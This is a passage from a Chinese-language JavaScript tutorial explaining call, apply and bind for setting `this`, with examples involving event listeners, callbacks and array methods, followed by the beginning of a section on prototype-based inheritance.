<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">o.<span class="property">f</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span> === o);<span class="comment">// true  ，如未改变this指向，this将指向 DOM 对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">  o.<span class="property">f</span>.<span class="title function_">apply</span>(o);</span><br><span class="line">  <span class="comment">// 或者 o.f.call(o);</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery 的写法</span></span><br><span class="line">$(<span class="string">&#x27;#button&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, f);</span><br></pre></td></tr></table></figure>

<p>上面代码中，点击按钮以后，控制台将会显示<code>true</code>。由于<code>apply</code>方法（或者<code>call</code>方法）不仅绑定函数执行时所在的对象，还会立即执行函数，因此不得不把绑定语句写在一个函数体内。更简洁的写法是采用下面介绍的<code>bind</code>方法。</p>
<h4 id="Function-prototype-bind"><a href="#Function-prototype-bind" class="headerlink" title="Function.prototype.bind()"></a>Function.prototype.bind()</h4><p> <code>bind</code>方法用于将函数体内的<code>this</code>绑定到某个对象，然后<strong>返回一个新函数，bind方法并非立即执行一个函数。</strong></p>
<h5 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">func.<span class="title function_">bind</span>(thisValue, arg1, arg2, ...)()</span><br><span class="line"><span class="comment">// 第一个参数thisValue为函数内this将要指向的对象</span></span><br><span class="line"><span class="comment">// 其余参数为传入函数的参数</span></span><br><span class="line"><span class="comment">// bind方法返回一个新函数，并非立即执行，如需执行要在后面加个括号</span></span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">d.<span class="title function_">getTime</span>() <span class="comment">// 1481869925657</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> print = d.<span class="property">getTime</span>;</span><br><span class="line"><span class="title function_">print</span>() <span class="comment">// Uncaught TypeError: this is not a Date object.</span></span><br></pre></td></tr></table></figure>

<p> 上面代码中，我们将<code>d.getTime</code>方法赋给变量<code>print</code>，然后调用<code>print</code>就报错了。这是因为<code>getTime</code>方法内部的<code>this</code>，绑定<code>Date</code>对象的实例，赋给变量<code>print</code>以后，内部的<code>this</code>已经不指向<code>Date</code>对象的实例了。 </p>
<p><code>bind</code>方法可以解决这个问题。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> print = d.<span class="property">getTime</span>.<span class="title function_">bind</span>(d);</span><br><span class="line"><span class="title function_">print</span>() <span class="comment">// 1481869925657</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>bind</code>方法将<code>getTime</code>方法内部的<code>this</code>绑定到<code>d</code>对象，这时就可以安全地将这个方法赋值给其他变量了。</p>
<p> <code>bind</code>方法的参数就是所要绑定<code>this</code>的对象，下面是一个更清晰的例子。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = &#123;</span><br><span class="line">  <span class="attr">count</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">inc</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = counter.<span class="property">inc</span>.<span class="title function_">bind</span>(counter);</span><br><span class="line"><span class="title function_">func</span>();</span><br><span class="line">counter.<span class="property">count</span> <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>counter.inc</code>方法被赋值给变量<code>func</code>。这时必须用<code>bind</code>方法将<code>inc</code>内部的<code>this</code>，绑定到<code>counter</code>，否则就会出错。</p>
<p><code>this</code>绑定到其他对象也是可以的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = &#123;</span><br><span class="line">  <span class="attr">count</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">inc</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">count</span>: <span class="number">100</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> func = counter.<span class="property">inc</span>.<span class="title function_">bind</span>(obj);</span><br><span class="line"><span class="title function_">func</span>();</span><br><span class="line">obj.<span class="property">count</span> <span class="comment">// 101</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>bind</code>方法将<code>inc</code>方法内部的<code>this</code>，绑定到<code>obj</code>对象。结果调用<code>func</code>函数以后，递增的就是<code>obj</code>内部的<code>count</code>属性。</p>
<p><code>bind</code>还可以接受更多的参数，将这些参数绑定原函数的参数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> add = <span class="keyword">function</span> (<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x * <span class="variable language_">this</span>.<span class="property">m</span> + y * <span class="variable language_">this</span>.<span class="property">n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">m</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">n</span>: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> newAdd = add.<span class="title function_">bind</span>(obj, <span class="number">5</span>); <span class="comment">// 第二个参数为add内的x</span></span><br><span class="line"><span class="title function_">newAdd</span>(<span class="number">5</span>) <span class="comment">// 20 传入的参数为add内的y</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>bind</code>方法除了绑定<code>this</code>对象，还将<code>add</code>函数的第一个参数<code>x</code>绑定成<code>5</code>，然后返回一个新函数<code>newAdd</code>，这个函数只要再接受一个参数<code>y</code>就能运行了。</p>
<p>如果<code>bind</code>方法的第一个参数是<code>null</code>或<code>undefined</code>，等于将<code>this</code>绑定到全局对象，函数运行时<code>this</code>指向顶层对象（浏览器为<code>window</code>）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> plus5 = add.<span class="title function_">bind</span>(<span class="literal">null</span>, <span class="number">5</span>);</span><br><span class="line"><span class="title function_">plus5</span>(<span class="number">10</span>) <span class="comment">// 15  传入的参数为add内的y</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，函数<code>add</code>内部并没有<code>this</code>，使用<code>bind</code>方法的主要目的是绑定参数<code>x</code>，以后每次运行新函数<code>plus5</code>，就只需要提供另一个参数<code>y</code>就够了。而且因为<code>add</code>内部没有<code>this</code>，所以<code>bind</code>的第一个参数是<code>null</code>，不过这里如果是其他对象，也没有影响。</p>
<h5 id="bind要注意的点："><a href="#bind要注意的点：" class="headerlink" title="bind要注意的点："></a>bind要注意的点：</h5><h5 id="（1）每一次返回一个新函数"><a href="#（1）每一次返回一个新函数" class="headerlink" title="（1）每一次返回一个新函数"></a>（1）每一次返回一个新函数</h5><p><code>bind</code>方法<strong>每运行一次，就返回一个新函数</strong>，这会产生一些问题。比如，监听事件的时候，不能写成下面这样。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, o.<span class="property">m</span>.<span class="title function_">bind</span>(o));</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>click</code>事件绑定<code>bind</code>方法生成的一个匿名函数。这样会导致无法取消绑定，所以，下面的代码是无效的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, o.<span class="property">m</span>.<span class="title function_">bind</span>(o));</span><br></pre></td></tr></table></figure>

<p>正确的方法是写成下面这样：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> listener = o.<span class="property">m</span>.<span class="title function_">bind</span>(o);</span><br><span class="line">element.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, listener);</span><br><span class="line"><span class="comment">//  ...</span></span><br><span class="line">element.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, listener);</span><br></pre></td></tr></table></figure>

<h5 id="（2）结合回调函数使用"><a href="#（2）结合回调函数使用" class="headerlink" title="（2）结合回调函数使用"></a>（2）结合回调函数使用</h5><p>回调函数是 JavaScript 最常用的模式之一，但是一个常见的错误是，将包含<code>this</code>的方法直接当作回调函数。解决方法就是使用<code>bind</code>方法，将<code>counter.inc</code>绑定<code>counter</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = &#123;</span><br><span class="line">  <span class="attr">count</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">inc</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callIt</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">  <span class="title function_">callback</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">callIt</span>(counter.<span class="property">inc</span>.<span class="title function_">bind</span>(counter));</span><br><span class="line">counter.<span class="property">count</span> <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>callIt</code>方法会调用回调函数。这时如果直接把<code>counter.inc</code>传入，调用时<code>counter.inc</code>内部的<code>this</code>就会指向全局对象。使用<code>bind</code>方法将<code>counter.inc</code>绑定<code>counter</code>以后，就不会有这个问题，<code>this</code>总是指向<code>counter</code>。</p>
<p>还有一种情况比较隐蔽，就是某些数组方法可以接受一个函数当作参数。这些函数内部的<code>this</code>指向，很可能也会出错。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  <span class="attr">times</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">  <span class="attr">print</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">times</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">n</span>) &#123; <span class="comment">// 数组的forEach方法内部this指向问题</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>); <span class="comment">// 这里的this指向全局对象</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="title function_">print</span>()</span><br><span class="line"><span class="comment">// 没有任何输出</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>obj.print</code>内部<code>this.times</code>的<code>this</code>是指向<code>obj</code>的，这个没有问题。但是，<code>forEach</code>方法的回调函数内部的<code>this.name</code>却是指向全局对象，导致没有办法取到值。稍微改动一下，就可以看得更清楚。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj.<span class="property">print</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">times</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span> === <span class="variable language_">window</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="title function_">print</span>()</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>解决这个问题，也是通过<code>bind</code>方法绑定<code>this</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj.<span class="property">print</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">times</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">  &#125;.<span class="title function_">bind</span>(<span class="variable language_">this</span>));<span class="comment">// 使用bind把this指向的obj对象传入方法内</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="title function_">print</span>()</span><br><span class="line"><span class="comment">// 张三</span></span><br><span class="line"><span class="comment">// 张三</span></span><br><span class="line"><span class="comment">// 张三</span></span><br></pre></td></tr></table></figure>

<h5 id="（3）结合call方法使用（改写数组方法调用形式）"><a href="#（3）结合call方法使用（改写数组方法调用形式）" class="headerlink" title="（3）结合call方法使用（改写数组方法调用形式）"></a>（3）结合<code>call</code>方法使用（改写数组方法调用形式）</h5><p>利用<code>bind</code>方法，可以<strong>改写一些 JavaScript 原生方法的使用形式</strong>，以数组的<code>slice</code>方法为例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">1</span>) <span class="comment">// [1]</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="number">0</span>, <span class="number">1</span>) <span class="comment">// [1]</span></span><br></pre></td></tr></table></figure>

<p>上面的代码中，数组的<code>slice</code>方法从<code>[1, 2, 3]</code>里面，按照指定位置和长度切分出另一个数组。这样做的本质是在<code>[1, 2, 3]</code>上面调用<code>Array.prototype.slice</code>方法，因此可以用<code>call</code>方法表达这个过程，得到同样的结果。</p>
<p><code>call</code>方法实质上是调用<code>Function.prototype.call</code>方法，因此上面的表达式可以<strong>用<code>bind</code>方法改写</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> slice = <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span>.<span class="title function_">bind</span>(<span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>);</span><br><span class="line"><span class="title function_">slice</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="number">0</span>, <span class="number">1</span>) <span class="comment">// [1]</span></span><br></pre></td></tr></table></figure>

<p>上面代码的含义就是，将<code>Array.prototype.slice</code>变成<code>Function.prototype.call</code>方法所在的对象，调用时就变成了<code>Array.prototype.slice.call</code>。类似的写法还可以用于其他数组方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> push = <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span>.<span class="title function_">bind</span>(<span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span>);</span><br><span class="line"><span class="keyword">var</span> pop = <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span>.<span class="title function_">bind</span>(<span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">pop</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span> ,<span class="number">2</span> ,<span class="number">3</span>];</span><br><span class="line"><span class="title function_">push</span>(a, <span class="number">4</span>)</span><br><span class="line">a <span class="comment">// [1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">pop</span>(a)</span><br><span class="line">a <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>

<p>如果再进一步，将<code>Function.prototype.call</code>方法绑定到<code>Function.prototype.bind</code>对象，就意味着<code>bind</code>的调用形式也可以被改写。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">v</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123; <span class="attr">v</span>: <span class="number">123</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> bind = <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span>.<span class="title function_">bind</span>(<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bind</span>);</span><br><span class="line"><span class="title function_">bind</span>(f, o)() <span class="comment">// 123</span></span><br></pre></td></tr></table></figure>

<p>上面代码的含义就是，将<code>Function.prototype.bind</code>方法绑定在<code>Function.prototype.call</code>上面，所以<code>bind</code>方法就可以直接使用，不需要在函数实例上使用。</p>
<h4 id="总结，call-、apply-、bind-的区别"><a href="#总结，call-、apply-、bind-的区别" class="headerlink" title="总结，call()、apply()、bind()的区别"></a>总结，call()、apply()、bind()的区别</h4><p>这三个方法都是改变函数内部this指向的。</p>
<p>它们的区别是：</p>
<p>call()第一个参数为函数内this将要指向的对象，其余参数为传入函数的参数。</p>
<p>apply()第一个参数为函数内this将要指向的对象，第二个参数为数组，数组每一项为传入函数的参数。</p>
<p>bind()传入参数和call()一样，区别是bind()返回一个新的函数，并非立即执行。</p>
<h2 id="三、对象的继承"><a href="#三、对象的继承" class="headerlink" title="三、对象的继承"></a>三、对象的继承</h2><p>面向对象编程很重要的一个方面，就是对象的继承。<strong>A 对象通过继承 B 对象，就能直接拥有 B 对象的所有属性和方法。这对于代码的复用是非常有用的</strong>。</p>
<p>大部分面向对象的编程语言，都是通过“类”（class）实现对象的继承。传统上，JavaScript 语言的继承不通过 class，而是通过“原型对象”（prototype）实现，本章介绍 JavaScript 的原型链继承。</p>
<p>ES6 引入了 class 语法，基于 class 的继承不在这个教程介绍，请参阅《ES6 标准入门》一书的相关章节。</p>
<p><strong>ES5 是通过“原型对象”（prototype）实现继承。</strong></p>
<h3 id="1、原型对象概述"><a href="#1、原型对象概述" class="headerlink" title="1、原型对象概述"></a>1、原型对象概述</h3><h4 id="（1）构造函数的缺点"><a href="#（1）构造函数的缺点" class="headerlink" title="（1）构造函数的缺点"></a>（1）构造函数的缺点</h4><p>JavaScript 通过构造函数生成新对象，因此<strong>构造函数可以视为对象的模板</strong>。实例对象的属性和方法，可以定义在构造函数内部。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Cat</span> (<span class="params">name, color</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">color</span> = color;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&#x27;大毛&#x27;</span>, <span class="string">&#x27;白色&#x27;</span>);</span><br><span class="line"></span><br><span class="line">cat1.<span class="property">name</span> <span class="comment">// &#x27;大毛&#x27;</span></span><br><span class="line">cat1.<span class="property">color</span> <span class="comment">// &#x27;白色&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>Cat</code>函数是一个构造函数，函数内部定义了<code>name</code>属性和<code>color</code>属性，所有实例对象（上例是<code>cat1</code>）都会生成这两个属性，即这两个属性会定义在实例对象上面。</p>
<p>通过构造函数为实例对象定义属性，虽然很方便，但是有一个缺点。<strong>同一个构造函数的多个实例之间，无法共享属性，从而造成对系统资源的浪费</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Cat</span>(<span class="params">name, color</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">color</span> = color;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">meow</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;喵喵&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解决方法，就是在原型对象（prototype）上创建共同的方法</span></span><br><span class="line"><span class="title class_">Cat</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">meow2</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;喵喵&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&#x27;大毛&#x27;</span>, <span class="string">&#x27;白色&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cat2 = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&#x27;二毛&#x27;</span>, <span class="string">&#x27;黑色&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// cat1和cat2是同一个构造函数的两个实例对象，他们无法共享meow属性，从而造成对系统资源的浪费。</span></span><br><span class="line">cat1.<span class="property">meow</span> === cat2.<span class="property">meow</span></span><br><span class="line"><span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">cat1.<span class="property">meow2</span> === cat2.<span class="property">meow2</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>cat1</code>和<code>cat2</code>是同一个构造函数的两个实例，它们都具有<code>meow</code>方法。由于<code>meow</code>方法是生成在每个实例对象上面，所以两个实例就生成了两次。也就是说，每新建一个实例，就会新建一个<code>meow</code>方法。这既没有必要，又浪费系统资源，因为所有<code>meow</code>方法都是同样的行为，完全应该共享。</p>
<p><strong>这个问题的解决方法，就是 JavaScript 的原型对象（prototype）。</strong></p>
<h4 id="（2）prototype-属性的作用"><a href="#（2）prototype-属性的作用" class="headerlink" title="（2）prototype 属性的作用"></a>（2）prototype 属性的作用</h4><p><strong>JavaScript 继承机制的设计思想就是，原型对象的所有属性和方法，都能被实例对象共享</strong>。也就是说，如果属性和方法定义在原型上，那么所有实例对象就能共享，不仅节省了内存，还体现了实例对象之间的联系。</p>
<p>下面，先看怎么为对象指定原型。JavaScript 规定，<strong>每个函数都有一个<code>prototype</code>属性，指向一个对象</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="keyword">typeof</span> f.<span class="property"><span class="keyword">prototype</span></span> <span class="comment">// &quot;object&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，函数<code>f</code>默认具有<code>prototype</code>属性，指向一个对象。</p>
<p> <strong>对于普通函数来说，该属性基本无用</strong>。但是，<strong>对于构造函数来说，生成实例的时候，该属性会自动成为实例对象的原型</strong>。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Animal.prototype属性是实例cat1和cat2的原型对象，在上面添加属性，实例就共享了该属性</span></span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">color</span> = <span class="string">&#x27;white&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&#x27;大毛&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cat2 = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&#x27;二毛&#x27;</span>);</span><br><span class="line"></span><br><span 